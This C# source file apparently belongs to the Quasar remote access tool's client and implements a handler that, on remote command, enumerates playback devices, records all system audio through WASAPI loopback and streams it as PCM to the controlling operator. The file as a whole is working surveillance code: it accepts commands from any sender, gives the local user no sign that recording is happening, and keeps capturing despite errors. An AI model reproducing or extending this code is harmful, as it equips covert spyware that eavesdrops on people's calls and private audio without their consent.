using NAudio.CoreAudioApi;
using NAudio.Wave;
using Quasar.Common.Messages;
using Quasar.Common.Networking;
using System;
using System.Collections.Generic;

namespace Quasar.Client.Messages
{
    public class AudioOutputCaptureHandler : NotificationMessageProcessor, IDisposable
    {
        private WasapiLoopbackCapture _loopbackCapture;
        private ISender _client;
        private int _sampleRate;
        private int _channels;
        private int _bitsPerSample;
        private List<MMDevice> _cachedDevices;

        public override bool CanExecute(IMessage message) => message is GetAudioOutputDevices ||
                                                              message is GetAudioOutputCapture ||
                                                              message is DoAudioOutputCaptureStop;

        public override bool CanExecuteFrom(ISender sender) => true;

        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetAudioOutputDevices msg:
                    Execute(sender, msg);
                    break;
                case GetAudioOutputCapture msg:
                    Execute(sender, msg);
                    break;
                case DoAudioOutputCaptureStop msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, GetAudioOutputDevices message)
        {
            try
            {
                var enumerator = new MMDeviceEnumerator();
                var devices = enumerator.EnumerateAudioEndPoints(DataFlow.Render, DeviceState.Active);
                _cachedDevices = new List<MMDevice>(devices);

                string[] names = new string[devices.Count];
                string[] ids = new string[devices.Count];
                for (int i = 0; i < devices.Count; i++)
                {
                    names[i] = devices[i].FriendlyName;
                    ids[i] = devices[i].ID;
                }
                client.Send(new GetAudioOutputDevicesResponse { DeviceNames = names, DeviceIds = ids });
            }
            catch (Exception)
            {
                client.Send(new GetAudioOutputDevicesResponse
                {
                    DeviceNames = new string[0],
                    DeviceIds = new string[0]
                });
            }
        }

        private void Execute(ISender client, GetAudioOutputCapture message)
        {
            try
            {
                if (message.CreateNew)
                {
                    StopCapture();

                    _client = client;

                    MMDevice device = null;
                    if (_cachedDevices != null && message.DeviceIndex < _cachedDevices.Count)
                    {
                        device = _cachedDevices[message.DeviceIndex];
                    }
                    else
                    {
                        // Re-enumerate and pick the device
                        var enumerator = new MMDeviceEnumerator();
                        var devices = enumerator.EnumerateAudioEndPoints(DataFlow.Render, DeviceState.Active);
                        _cachedDevices = new List<MMDevice>(devices);
                        if (message.DeviceIndex < _cachedDevices.Count)
                            device = _cachedDevices[message.DeviceIndex];
                    }

                    if (device == null)
                        return;

                    _loopbackCapture = new WasapiLoopbackCapture(device);

                    // Capture in the device's native format (usually 32-bit float)
                    // We'll convert to 16-bit PCM for transmission
                    _sampleRate = _loopbackCapture.WaveFormat.SampleRate;
                    _channels = _loopbackCapture.WaveFormat.Channels;
                    _bitsPerSample = 16;

                    _loopbackCapture.DataAvailable += LoopbackCapture_DataAvailable;
                    _loopbackCapture.RecordingStopped += LoopbackCapture_RecordingStopped;
                    _loopbackCapture.StartRecording();

                    OnReport("Audio output capture started");
                }
            }
            catch (Exception)
            {
                StopCapture();
            }
        }

        private void Execute(ISender client, DoAudioOutputCaptureStop message)
        {
            StopCapture();
            OnReport("Audio output capture stopped");
        }

        private void LoopbackCapture_DataAvailable(object sender, WaveInEventArgs e)
        {
            try
            {
                if (_client != null && e.BytesRecorded > 0)
                {
                    // Convert from the capture format (usually IEEE float 32-bit) to 16-bit PCM
                    byte[] pcmData = ConvertToPcm16(e.Buffer, e.BytesRecorded, _loopbackCapture.WaveFormat);

                    if (pcmData != null && pcmData.Length > 0)
                    {
                        _client.Send(new GetAudioOutputCaptureResponse
                        {
                            Audio = pcmData,
                            SampleRate = _sampleRate,
                            Channels = _channels,
                            BitsPerSample = _bitsPerSample
                        });
                    }
                }
            }
            catch (Exception)
            {
                // Ignore send errors to keep capture going
            }
        }

        private byte[] ConvertToPcm16(byte[] buffer, int bytesRecorded, WaveFormat sourceFormat)
        {
            if (sourceFormat.Encoding == WaveFormatEncoding.IeeeFloat)
            {
                int sampleCount = bytesRecorded / 4; // 4 bytes per float sample
                byte[] pcm = new byte[sampleCount * 2]; // 2 bytes per 16-bit sample
                for (int i = 0; i < sampleCount; i++)
                {
                    float sample = BitConverter.ToSingle(buffer, i * 4);
                    // Clamp to [-1, 1]
                    sample = Math.Max(-1f, Math.Min(1f, sample));
                    short pcmSample = (short)(sample * 32767);
                    pcm[i * 2] = (byte)(pcmSample & 0xFF);
                    pcm[i * 2 + 1] = (byte)((pcmSample >> 8) & 0xFF);
                }
                return pcm;
            }
            else if (sourceFormat.BitsPerSample == 16)
            {
                byte[] pcm = new byte[bytesRecorded];
                Array.Copy(buffer, pcm, bytesRecorded);
                return pcm;
            }
            else
            {
                // Unsupported format, return empty
                return new byte[0];
            }
        }

        private void LoopbackCapture_RecordingStopped(object sender, StoppedEventArgs e)
        {
            // Recording stopped externally or due to error
        }

        private void StopCapture()
        {
            if (_loopbackCapture != null)
            {
                try
                {
                    _loopbackCapture.DataAvailable -= LoopbackCapture_DataAvailable;
                    _loopbackCapture.RecordingStopped -= LoopbackCapture_RecordingStopped;
                    _loopbackCapture.StopRecording();
                }
                catch
                {
                }
                finally
                {
                    _loopbackCapture.Dispose();
                    _loopbackCapture = null;
                }
            }
        }

        /// <summary>
        /// Disposes all managed and unmanaged resources associated with this message processor.
        /// </summary>
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                StopCapture();
            }
        }
    }
}
